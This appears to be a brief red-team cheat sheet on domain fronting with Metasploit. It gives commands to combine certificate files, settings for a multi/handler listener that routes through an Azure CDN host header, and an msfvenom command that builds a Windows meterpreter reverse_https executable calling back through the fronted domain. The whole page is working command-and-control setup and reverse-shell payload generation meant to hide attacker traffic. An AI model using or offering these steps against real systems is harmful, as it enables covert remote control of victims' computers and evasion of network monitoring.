# Domain Fronting

## Domain Fronting

### Add a letsencrypt cert 

```text
cat privkey2.pem fullchain2.pem > msf.pem 
```

### Multi-handler config

```text
msf5 exploit(multi/handler) > set LHOST good.domain.com
msf5 exploit(multi/handler) > set OverrideLHOST good.domain.com
msf5 exploit(multi/handler) > set OverrideRequestHost true
msf5 exploit(multi/handler) > set HttpHostHeader baddomain.azureedge.net
```

{% hint style="info" %}
OverrideLHOST and OverrideRequestHost are only require in case of Staged Payload.

These options avoid host overwrite for the second staged payload.
{% endhint %}

### Payload

```csharp
msfvenom -p windows/meterpreter/reverse_https LHOST=good.domain.com \
LPORT=443 HttpHostHeader=baddomain.azureedge.net \
-f exe -o ~/path/to/payload.exe
```

